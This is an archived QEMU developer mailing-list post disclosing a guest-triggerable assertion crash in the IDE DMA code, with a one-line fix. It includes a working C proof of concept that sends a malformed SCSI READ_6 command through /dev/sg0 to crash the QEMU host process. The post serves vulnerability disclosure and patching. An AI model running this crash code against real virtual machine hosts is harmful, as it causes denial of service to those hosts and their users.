

| | **qemu-devel** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=qemu-devel)

---

[[Date Prev](msg01650.html)][[Date Next](msg01652.html)][[Thread Prev](msg01634.html)][[Thread Next](msg01650.html)][[Date Index](index.html#01651)][[Thread Index](threads.html#01651)]

## [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to preve

---

| **From**: | Alexander Popov |
| --- | --- |

| **Subject**: | [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest |
| **Date**: | Fri, 5 Jul 2019 17:07:49 +0300 |

---

```
This assertion was introduced in the commit a718978ed58a in July 2015.
It implies that the size of successful DMA transfers handled in
ide_dma_cb() should be multiple of 512 (the size of a sector).

But guest systems can initiate DMA transfers that don't fit this
requirement. Let's improve the assertion to prevent qemu DoS from quests.

PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
command and crash qemu:

#include <stdio.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <scsi/scsi.h>
#include <scsi/scsi_ioctl.h>

#define CMD_SIZE 2048

struct scsi_ioctl_cmd_6 {
        unsigned int inlen;
        unsigned int outlen;
        unsigned char cmd[6];
        unsigned char data[];
};

int main(void)
{
        intptr_t fd = 0;
        struct scsi_ioctl_cmd_6 *cmd = NULL;

        cmd = malloc(CMD_SIZE);
        if (!cmd) {
                perror("[-] malloc");
                return 1;
        }

        memset(cmd, 0, CMD_SIZE);
        cmd->inlen = 1337;
        cmd->cmd[0] = READ_6;

        fd = open("/dev/sg0", O_RDONLY);
        if (fd == -1) {
                perror("[-] opening sg");
                return 1;
        }

        printf("[+] sg0 is opened\n");

        printf("[.] qemu should break here:\n");
        fflush(stdout);
        ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
        printf("[-] qemu didn't break\n");

        free(cmd);

        return 1;
}

Signed-off-by: Alexander Popov <address@hidden>
---
 hw/ide/core.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/hw/ide/core.c b/hw/ide/core.c
index 6afadf8..304fe69 100644
--- a/hw/ide/core.c
+++ b/hw/ide/core.c
@@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)

     sector_num = ide_get_sector(s);
     if (n > 0) {
-        assert(n * 512 == s->sg.size);
+        assert(n == s->sg.size / 512);
         dma_buf_commit(s, s->sg.size);
         sector_num += n;
         ide_set_sector(s, sector_num);
--
2.7.4

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg01650.html)] |
| --- | --- | --- |

* **[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest**,
  *Alexander Popov*Â **<=**
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01650.html)**, *Alexander Popov*, 2019/07/05
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03354.html)**, *Alexander Popov*, 2019/07/15
    - **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03736.html)**, *Kevin Wolf*, 2019/07/16
      * **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03817.html)**, *John Snow*, 2019/07/16* **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03869.html)**, *P J P*, 2019/07/16
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg05834.html)**, *John Snow*, 2019/07/25
    - **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg06169.html)**, *Alexander Popov*, 2019/07/26

---

* Prev by Date:
  **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01650.html)**
* Next by Date:
  **[[Qemu-devel] [Bug 1835477] Re: Converting qcow2 to vmdk on MacOSX results in a non-bootable image](msg01652.html)**
* Previous by thread:
  **[[Qemu-devel] [PATCH v15 0/7] virtio pmem driver](msg01634.html)**
* Next by thread:
  **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01650.html)**
* Index(es):
  + [**Date**](index.html#01651)
  + [**Thread**](threads.html#01651)

